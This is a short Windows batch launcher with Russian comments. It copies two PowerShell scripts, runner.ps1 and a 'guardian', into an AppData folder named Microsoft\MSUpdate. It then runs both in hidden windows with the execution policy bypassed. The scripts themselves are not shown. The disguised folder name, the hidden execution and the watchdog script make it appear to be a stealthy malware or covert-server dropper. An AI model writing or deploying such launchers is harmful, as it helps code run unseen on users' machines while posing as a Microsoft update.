@echo off
set "WORKDIR=%USERPROFILE%\AppData\Local\Microsoft\MSUpdate"

:: Проверяем, лежат ли файлы на месте, если запускаем из другой папки
if not exist "%WORKDIR%" mkdir "%WORKDIR%"
if exist "%~dp0runner.ps1" copy "%~dp0runner.ps1" "%WORKDIR%\runner.ps1" /Y >nul
if exist "%~dp0guardian.ps1" copy "%~dp0guardian.ps1" "%WORKDIR%\guardian.ps1" /Y >nul

:: Запускаем сервер и стража в скрытом режиме
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%WORKDIR%\runner.ps1"
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%WORKDIR%\guardian.ps1"

exit

